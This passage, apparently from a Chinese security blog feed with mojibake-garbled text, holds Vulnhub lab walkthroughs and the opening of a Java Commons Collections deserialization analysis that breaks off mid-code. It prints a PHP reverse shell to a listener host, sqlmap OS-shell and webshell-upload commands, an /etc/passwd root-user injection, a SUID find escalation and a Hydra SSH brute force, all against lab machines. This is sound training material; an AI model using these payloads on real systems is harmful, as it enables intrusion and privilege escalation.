src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334177.png" alt="image-20230503133433140"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>Áî®pythonËé∑Âèñ‰∫§‰∫íÂºèshell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334420.png" alt="image-20230503133444394"><br>Áúã‰∏Ä‰∏ãÁî®Êà∑ÊùÉÈôêÔºåÂè™ÊòØ‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334760.png" alt="image-20230503133458731"><br>Ê†πÊçÆflag1ÊèêÁ§∫Áúã‰∏Ä‰∏ãÈÖçÁΩÆÊñá‰ª∂ÔºåÈÄöËøáÁôæÂ∫¶ÂæóÂà∞ÈÖçÁΩÆÊñá‰ª∂Âêçsettings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰πüÂèØ‰ª•‰ΩøÁî®ÂëΩ‰ª§<code>find . -name &quot;set*&quot;</code>ÊêúÂà∞ÈÖçÁΩÆÊñá‰ª∂<br>ÊãøÂà∞flag2Âíå‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335864.png" alt="image-20230503133518795"></p><h2 id="flag3ÔºåÊãø‰∏ãÊï∞ÊçÆÂ∫ì"><a href="#flag3ÔºåÊãø‰∏ãÊï∞ÊçÆÂ∫ì" class="headerlink" title="flag3ÔºåÊãø‰∏ãÊï∞ÊçÆÂ∫ì"></a>flag3ÔºåÊãø‰∏ãÊï∞ÊçÆÂ∫ì</h2><p>ÁôªÂÖ•Êï∞ÊçÆÂ∫ì<br><code>mysql -udbuser -pR0ck3t</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335424.png" alt="image-20230503133539364"><br>ÁÑ∂ÂêéÂ∞±ÊòØÊü•Áúã‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ìÈáåÈù¢ÁöÑ‰∏úË•ø<br><code>show databases;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335139.png" alt="image-20230503133553088"><br><code>use drupaldb;show tables;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336614.png" alt="image-20230503133605586"><br>Êü•ÁúãËøô‰∏™usersË°®<br><code>select * from users\G;</code><br>ËøôÈáå<code>\G</code>Â∞±ÊòØÁ∫µÂêëÊòæÁ§∫Êï∞ÊçÆ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336167.png" alt="image-20230503133616089"><br>ÂæóÂà∞‰∏§‰∏™Áî®Êà∑Ôºå‰∏çËøáÂØÜÁ†Å‰∏çÊòØÊòéÊñáÔºåÊ®°Á≥äÊêúÁ¥¢‰∏Ä‰∏ãÁúãÁúãÊúâÊ≤°ÊúâÂä†ÂØÜËÑöÊú¨<br><code>find . -name &quot;*hash*&quot;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336085.png" alt="image-20230503133629051"><br>ÊâæÂà∞Âä†ÂØÜËÑöÊú¨ÔºåÁÆÄÂçïËøêË°å‰∏Ä‰∏ãÁúãÁúã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336935.png" alt="image-20230503133639889"><br>ËøôÈáåÂ∫îËØ•Â∞±ÊòØÁõ¥Êé•Âú®ÂêéÈù¢Âä†‰∏äÂØÜÁ†ÅÂ∞±ÂèØ‰ª•ÂæóÂà∞ÂØÜÊñáÔºåÂèçÊ≠£Â∞±ÊòØÂ§öÂ∞ùËØï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336174.png" alt="image-20230503133652131"><br>ËøôÈáåÊàë‰ª¨ÊÉ≥ËØïÂá∫adminÁöÑÂØÜÁ†ÅÂæàÈöæÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±Áõ¥Êé•Âú®Êï∞ÊçÆÂ∫ìÈáåÈù¢ËøõË°åÊõøÊç¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DQg60FlJLrmVGTkV6v6xnQKJGLPv9Bq5mNizW6/kv0IeIyA.2dyd&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337238.png" alt="image-20230503133707194"><br>ÊõøÊç¢ÊàêÂäüÔºåÁÑ∂ÂêéÁôªÂΩïÁúãÁúã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337851.png" alt="image-20230503133717797"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337379.png" alt="image-20230503133727343"><br>Âú®ËøôÈáåÊâæÂà∞flag3</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>Ê†πÊçÆflag3ÊèêÁ§∫ÔºåÊâìÂºÄ&#x2F;etc&#x2F;passwdÁúãÁúã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337479.png" alt="image-20230503133743399"><br>ÂæóÂà∞flag4Áî®Êà∑ÔºåÂπ∂‰∏îÂú®Áî®Êà∑ÁõÆÂΩï‰∏ãÂèØ‰ª•ÊâæÂà∞flag4ÔºåËøôÈáå‰πüÂèØ‰ª•‰ΩøÁî®Â∑•ÂÖ∑HydraÂéªÁàÜÁ†¥Áî®Êà∑sshÂØÜÁ†ÅËøúÁ®ãÁôªÂΩï<br><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.75.133</code><br>‰ΩÜÊòØÊó¢ÁÑ∂ËÉΩÁõ¥Êé•ÊâìÂºÄÊ≤°ÂøÖË¶ÅÂéªÁàÜÁ†¥<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337304.png" alt="image-20230503133756258"><br>ÊèêÁ§∫rootÁõÆÂΩï‰ΩÜÊòØÊ≤°ÊúâÊùÉÈôêÊâìÂºÄÔºåÂºÄÂßãÊèêÊùÉ</p><h2 id="flag5ÔºåsuidÊèêÊùÉ"><a href="#flag5ÔºåsuidÊèêÊùÉ" class="headerlink" title="flag5ÔºåsuidÊèêÊùÉ"></a>flag5ÔºåsuidÊèêÊùÉ</h2><p>Âà©Áî®findÂëΩ‰ª§ÔºåÊâæÊü•ÂÖ∑ÊúâSUIDÊùÉÈôêÁöÑÂèØÊâßË°å‰∫åËøõÂà∂Êñá‰ª∂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find Êåá‰ª§  </span><br><span class="line">/ Ê†πÁõÆÂΩï(Êü•Êâæ‰ΩçÁΩÆ)  </span><br><span class="line">-perm ÊùÉÈôê  </span><br><span class="line">-u Áî®Êà∑(s=ÁâπÊùÉ)  </span><br><span class="line">-type Á±ªÂûã  </span><br><span class="line">f Êñá‰ª∂  </span><br><span class="line">2&gt;/dev/nul ËøáÊª§ÈîôËØØ‰ø°ÊÅØ(‰∏çÊòæÁ§∫ÈîôËØØ‰ø°ÊÅØ)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338317.png" alt="image-20230503133811249"><br>findÂëΩ‰ª§Âú®ÈáåÈù¢ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÂÆÉÊù•ÊèêÊùÉ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">ÊâæÊü•‰ªÄ‰πàÊñá‰ª∂‰∏çÈáçË¶ÅÔºà‰ΩÜÊòØÊòØÂ≠òÂú®ÁöÑÊñá‰ª∂ÔºâÔºåÂè™ÈúÄË¶ÅÊ†ºÂºèÂØπÔºåÁÑ∂ÂêéÂêéÈù¢Âä†‰∏ä</span><br><span class="line">-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338793.png" alt="image-20230503133821756"><br>ÊèêÊùÉÊàêÂäüÔºåÁÑ∂ÂêéËøõÂÖ•rootÁõÆÂΩïÊü•Áúã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338643.png" alt="image-20230503133830589"><br>ÊâæÂà∞ÊúÄÂêé‰∏Ä‰∏™flagÔºåÊâìÈù∂ÁªìÊùü</p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--Ai-Web1</title>
      <link href="/2023/05/Vulnhub-Ai-Web1/"/>
      <url>/2023/05/Vulnhub-Ai-Web1/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><p>Áõ¥Êé•‰∏ãËΩΩÈù∂Êú∫ÁÑ∂ÂêéËß£ÂéãÔºåVMware‰∏äËøêË°åvmxÊñá‰ª∂Â∞±Ë°åÔºå<a href="https://www.vulnhub.com/entry/ai-web-1,353/">Èù∂Êú∫ÈìæÊé•</a><br>ËøêË°åÈù∂Êú∫‰ºöÊúâË¶ÅÂØÜÁ†ÅÁôªÂΩïÔºåÂà´ÁÆ°Â∞±Ë°åÔºåÂõ†‰∏∫Ê∏óÈÄèÂ∑≤ÁªèÂºÄÂßã‰∫ÜÔºÅÔºÅ</p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>‰ΩøÁî®netdiscoverÊâ´Êèèip<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012014759.png" alt="image-20230501201446634"><br>Êå®‰∏™ËÆøÈóÆÔºåÊúÄÁªàÂèëÁé∞192.168.75.132Ëøô‰∏™IPÂèØÁñë<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015300.png" alt="image-20230501201508266"><br>nmapÊâ´Êèè‰∏Ä‰∏ãËøô‰∏™IP Êü•ÁúãÂºÄÊîæÁ´ØÂè£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -P 192.168.75.132</span><br><span class="line">-T4(ÈÄüÂ∫¶) -sV(ÁâàÊú¨Êâ´ÊèèÂíåÂºÄÂêØÁöÑÊúçÂä°) -O(Êìç‰ΩúÁ≥ªÁªü) -p-ÔºàÂÖ®ÈÉ®Á´ØÂè£</span><br><span class="line">ËøôÈáåÂÖ∂ÂÆûÁî®-AÂ∞±ÂèØ‰ª•Ôºå‰∏ªË¶ÅÊó∂ÁÜüÊÇâ‰∏Ä‰∏ãÂèÇÊï∞</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015178.png" alt="image-20230501201519095"><br>ÂèØ‰ª•ÁúãÂà∞80Á´ØÂè£ÂºÄÊîæ‰πüÂ∞±ÊòØÊàë‰ª¨‰∏ÄÂºÄÂßãËÆøÈóÆÁöÑÈÇ£‰∏™È°µÈù¢ÔºåÁõ¥Êé•Êâ´‰∏Ä‰∏ãÁõÆÂΩï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015905.png" alt="image-20230501201529877"><br>Â≠òÂú®‰∏Ä‰∏™robots.txt<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015947.png" alt="image-20230501201540911"><br>emmmmÔºå‰∏§‰∏™ÈÉΩÊòØ403ÔºåÁÑ∂ÂêéÂØπÁùÄËøô‰∏™‰∏§‰∏™Ë∑ØÂæÑÊâ´‰∏Ä‰∏ãÔºåÊâ´Âà∞‰∏Ä‰∏™<code>http://192.168.75.132/m3diNf0/info.php</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015714.png" alt="image-20230501201552683"><br>ÁΩëÁ´ôÁöÑÁªùÂØπË∑ØÂæÑÔºåÁÑ∂ÂêéÊâ´Âè¶‰∏Ä‰∏™<code>http://192.168.75.132/se3reTdir777</code>ËøôÈáå‰∏ÄÂºÄÂßãÊâ´ÁöÑuploads‰ΩÜÊòØÊ≤°Êúâ‰∏úË•øÁÑ∂ÂêéÂ∞±Êâ´‰∫ÜËøô‰∏™ÔºåÁúãwpÊúâÁöÑÊòØÁî®ÁöÑkali‰∏ãÁöÑdirbÔºåÊ∂®ÂßøÂäø‰∫Ü‰ª•ÂâçÈÉΩ‰∏çÁü•ÈÅìËøô‰∏™Â∑•ÂÖ∑<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016438.png" alt="image-20230501201605406"><br>ËÆøÈóÆindex.phpÔºå‰∏≠ÈÄîÊñ≠ÂºÄËøûÊé•‰∫ÜËøò‰ª•‰∏∫ÊòØÈ¢òÁõÆÁöÑËÆæÂÆö„ÄÇ„ÄÇ„ÄÇËÆøÈóÆÂæóÂà∞‰∏ãÈù¢ÁöÑË°®Âçï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016204.png" alt="image-20230501201615163"></p><h2 id="sqlÊ≥®ÂÖ•"><a href="#sqlÊ≥®ÂÖ•" class="headerlink" title="sqlÊ≥®ÂÖ•"></a>sqlÊ≥®ÂÖ•</h2><p>‰ΩøÁî®<code>1&#39;</code>Êé¢ÊµãÊòØÂê¶Â≠òÂú®sqlÊ≥®ÂÖ•ÔºåÂèëÁé∞Êä•Èîô<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016498.png" alt="image-20230501201626465"><br>ÁÑ∂Âêé‰ΩøÁî®<code>1&#39;#</code>Ê≠£Â∏∏sqlÊ≥®ÂÖ•Ê≤°Ë∑ë‰∫Ü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016645.png" alt="image-20230501201634617"><br>Êäì‰∏™ÂåÖÂæóÂà∞ÂèÇÊï∞ÔºåÂõ†‰∏∫ÊòØpostÊ≥®ÂÖ•Áõ¥Êé•‰øùÂ≠ò‰∏Ä‰∏ãËøô‰∏™ÂåÖÁÑ∂Âêé‰∏¢sqlmapÂÖàË∑ë‰∏Ä‰∏ãÔºåÊØïÁ´ü‰∏çÊòØctfÈ¢òÂ∫îËØ•ËÉΩË∑ëÂá∫Êù•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016931.png" alt="image-20230501201645892"><br><code>python sqlmap.py -r &quot;E:\vuluhubÈù∂Âú∫\AI Web 1.0\ÂÅöÈ¢ò\1.txt&quot; -p uid --dbs</code>ÊâßË°åÂëΩ‰ª§Áõ¥Êé•Ë∑ëÔºåË∑ëÁöÑÊó∂ÂÄôÊâãÂ∑•Êµã‰∫Ü‰∏Ä‰∏ãÂèëÁé∞unionÊ≤°Ê≥ïÊ≥®Âõ†‰∏∫Ê≤°ÊúâÂõûÊòæÔºåÁÑ∂ÂêéÂèëÁé∞Â≠òÂú®Âª∂Êó∂Ê≥®ÂÖ•ÔºåÊûúÁÑ∂sqlmap‰∏ÄÂºÄÂßãÊ≤°Ê≥®Âá∫Êù•<br><code>python sqlmap.py -r &quot;E:\vuluhubÈù∂Âú∫\AI Web 1.0\ÂÅöÈ¢ò\1.txt&quot; -p uid --technique=T --dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmapÊåáÂÆöÊ≥®ÂÖ•Á±ªÂûã</span><br><span class="line">--technique=T</span><br><span class="line">B:Â∏ÉÂ∞îÁõ≤Ê≥®</span><br><span class="line">E:Êä•ÈîôÊ≥®ÂÖ•</span><br><span class="line">U:ËÅîÂêàÊü•ËØ¢Ê≥®ÂÖ•</span><br><span class="line">S:Êñá‰ª∂Á≥ªÁªü,Êìç‰ΩúÁ≥ªÁªü,Ê≥®ÂÜåË°®Áõ∏ÂÖ≥</span><br><span class="line">T:Êó∂Èó¥Áõ≤Ê≥®</span><br></pre></td></tr></table></figure><p>Ëøô‰∏§ÁßçÊñπÂºèÈÉΩÊ≤°Ê≥®Âá∫Êù•„ÄÇ„ÄÇ„ÄÇÁúãÁúãwpÊÄé‰πàÊ≥®ÁöÑÂêß<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs</code><br>Â•ΩÂêßÔºåÁõ¥Êé•ÊåáÂÆöÂèÇÊï∞Ê≥®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017136.png" alt="image-20230501201714088"><br>emmmÔºåkali‰∏ãÁöÑsqlmapËøô‰πàÂø´ÁöÑÂêóÔºå‰∏ÄÁõ¥Áî®ÁöÑWindows‰∏ãÁöÑÔºåÁúãÁúãaiweb1<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --tables -D aiweb1</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017717.png" alt="image-20230501201722682"><br>ÁúãÂ≠óÊÆµ<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --columns -D aiweb1 -T user</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017314.png" alt="image-20230501201733277"><br>Ê≤°Âï•‰∏úË•øÔºåÁõ¥Êé•ÊãøshellÂêß<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --os-shell</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017902.png" alt="image-20230501201755826"><br>‰∏ãÈù¢ÁöÑ2‰∏∫Ëá™ÂÆö‰πâ‰∏ä‰º†Ë∑ØÂæÑÁªìÂêàÊàë‰ª¨ÂàöÂàöÂæóÂà∞ÁöÑÁªùÂØπË∑ØÂæÑÂ∞±ËÉΩÁü•ÈÅìÈ©¨ÁöÑ‰ΩçÁΩÆÔºåÈÄöËøá‰∏ãÈù¢ÁöÑÊìç‰ΩúËÉΩÁü•ÈÅìÊùÉÈôêÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàwhoamiÂëΩ‰ª§Ê≤°ÊúâËæìÂá∫ÔºåÈöæÈÅìÊ≤°ÊúâÔºüÔºü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018282.png" alt="image-20230501201810247"><br>Áü•ÈÅìÁªùÂØπË∑ØÂæÑÈÇ£Â∞±ÂÜô‰∏™‰∏ÄÂè•ËØùÊú®È©¨ËøõÂÖ•ÔºåsqlmapÁöÑÈ©¨ËöÅÂâëËøû‰∏ç‰∏ä</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.132/se3reTdir777&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./2.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/2.php</span><br><span class="line"></span><br><span class="line">--file-write:ÂéªËØªÂèñÊñá‰ª∂(1.php)</span><br><span class="line">--file-dest:ÂêéÈù¢Âä†ÁõÆÊ†áÁöÑÁªùÂØπË∑ØÂæÑ Â∑≤ÁªèÁîüÊàêÊú®È©¨ÁöÑÂêçÁß∞Ôºà1.phpÔºâ</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà‰∏ÄÊ†∑ÁöÑÂëΩ‰ª§wpËÉΩ‰∏ä‰º†‰∏äÂéªÊàë‰∏çË°åÔºåÊó¢ÁÑ∂‰∏ÄÂè•ËØù‰º†‰∏ç‰∏äÂéªÈÇ£Â∞±Áõ¥Êé•Â∞ùËØïÂèçÂºπshell</p><h2 id="ÂèçÂºπshell"><a href="#ÂèçÂºπshell" class="headerlink" title="ÂèçÂºπshell"></a>ÂèçÂºπshell</h2><p>ÂáÜÂ§á‰∏Ä‰∏™ÂèçÂºπshellÁöÑphpÊñá‰ª∂,ÔºåIP‰∏∫kali IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.75.128&quot;</span>,<span class="number">6666</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Âà©Áî®pythonÊê≠Âª∫‰∏Ä‰∏™ÁÆÄÊòìÁöÑwebÊúçÂä°ÔºåËøôÈáåpythonÂÜÖÁΩÆ‰∫ÜÊ®°ÂùóÂè™ÈúÄË¶ÅÊâßË°åÂëΩ‰ª§Â∞±Ë°åÔºå‰∏ãÈù¢‰∏∫python3ÁéØÂ¢É</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br><span class="line"><span class="comment">#9999‰∏∫Á´ØÂè£Âè∑ÔºåÂèØËá™Â∑±ÊåáÂÆö</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂ∞±‰ºöÂú®È°µÈù¢ÊòæÁ§∫ÂΩìÂâçÁõÆÂΩïÁöÑÊñá‰ª∂ÔºåÂ¶ÇÊûúÊúâÈªòËÆ§ÁöÑindex.htmlÊñá‰ª∂Â∞±‰ºö‰ºòÂÖàÊòæÁ§∫ÔºåËøôÈáåÂèàÊúâ‰∏™ÂùëÂ∞±ÊòØÊàëÊñá‰ª∂ÊîæÂú®Ê°åÈù¢ÂÆÉ‰∏çÊòæÁ§∫Ôºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018642.png" alt="image-20230501201822611"><br>ÁÑ∂ÂêéÂú®Èù∂Êú∫‰∏ä‰ΩøÁî®wget‰∏ãËΩΩshellÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018555.png" alt="image-20230501201833498"><br>Âª∫Á´ãÁõëÂê¨ÔºåÁÑ∂ÂêéÂú®Èù∂Êú∫‰∏äËøêË°åshell.php<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018907.png" alt="image-20230501201842818"><br>ËøôÈáå‰∏ÄÊ¨°Ê≤°ÊàêÂäüÂ§öËØïÂá†‰∏ãÂ∞±Ë°åÔºåÊü•ÁúãÊùÉÈôê‰∏∫www-dataÔºå‰∏ãÈù¢ÂºÄÂßãÊèêÊùÉ</p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>ÊâßË°åÂëΩ‰ª§<code>ls -l /etc/passwd</code>ÂèØ‰ª•ÁúãÂà∞ÂΩìÂâçÁî®Êà∑ÂØπetc&#x2F;passwdÊñá‰ª∂ÂÖ∑Êúârw(ËØªÂÜô)ÊùÉÈôê<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019372.png" alt="image-20230501201935342"><br>ÂÜôÂÖ•ÁöÑÊó∂ÂÄôÂØÜÁ†ÅÊòØÂä†ÂØÜÁöÑÔºåÊâÄ‰ª•Ë¶ÅÂÖàÂä†ÂØÜÂØÜÁ†ÅÔºö<br><code> openssl passwd -1 -salt web1 123456</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019455.png" alt="image-20230501201943426"><br>ÁÑ∂ÂêéÂÜôÂÖ•ÂØÜÁ†Å<br><code>echo &#39;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#39; &gt;&gt;/etc/passwd</code><br>Áõ¥Êé•ÂàáÊç¢Áî®Êà∑‰ºöÊä•Èîô<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021388.png" alt="image-20230501202106358"><br>ËΩ¨Êç¢‰∏∫‰∫§‰∫íÂºèshell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021499.png" alt="image-20230501202135452"><br>ÂèØ‰ª•ÁúãÂà∞ÊùÉÈôêÂ∑≤ÁªèÊòØroot‰∫ÜÔºåflagÂú®rootÁõÆÂΩï‰∏ã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021654.png" alt="image-20230501202154593"><br>Á¨¨‰∏ÄÊ¨°ÂÅöËøôÁßçÈù∂Âú∫ËøòÊå∫ÊúâÊÑèÊÄù</p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CCÈìæ1--LazyMapÈìæ</title>
      <link href="/2023/04/CC%E9%93%BE1-LazyMap%E9%93%BE/"/>
      <url>/2023/04/CC%E9%93%BE1-LazyMap%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="ÂºÄÂßãÂàÜÊûê"><a href="#ÂºÄÂßãÂàÜÊûê" class="headerlink" title="ÂºÄÂßãÂàÜÊûê"></a>ÂºÄÂßãÂàÜÊûê</h2><p>ËøôÈáåÊàëÁõ¥Êé•Êãøcc1ÁöÑdemoÊîπ‰∫ÜÔºåÈ¶ñÂÖàËøõÂÖ•<code>InvokerTransformer</code>‰∏ãÁöÑ<code>transform</code>ÊñπÊ≥ïÁÑ∂Âêéfind usages<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819199.png" alt="image-20230430181911069"><br>ÂèØ‰ª•ÁúãÂà∞LazyMap‰∏ã‰πüË∞ÉÁî®‰∫Ü<code>transform</code>ÊñπÊ≥ïÔºåÁõ¥Êé•ËøõÂéªÁúã‰ª£Á†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>publicÂûã<code>get</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>transform</code>ÊñπÊ≥ïÔºåÁÑ∂ÂêéÂéªÁúãfactory<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819343.png" alt="image-20230430181932250"><br>ÁÑ∂ÂêéËøôÈáåÂêåÊó∂ËøòÊúâdecorateÊñπÊ≥ïÂíå<code>TransformMap</code> ‰∏≠ÁöÑ <code>decorate</code> ÊñπÊ≥ïÊòØ‰∏ÄÊ†∑ÁöÑ‰ΩúÁî®ÔºåÁÑ∂ÂêéÂéªÁúãËøô‰∏™Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏∫<code>protected</code>ÊâÄ‰ª•ÂæóÈÄöËøádecorateÊñπÊ≥ïËé∑ÂæóLazyMapÁ±ªÁöÑÂØπË±°ÂéªË∞ÉÁî®<br>ÂÖàÂÜô‰∏™expÂºπËÆ°ÁÆóÂô®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 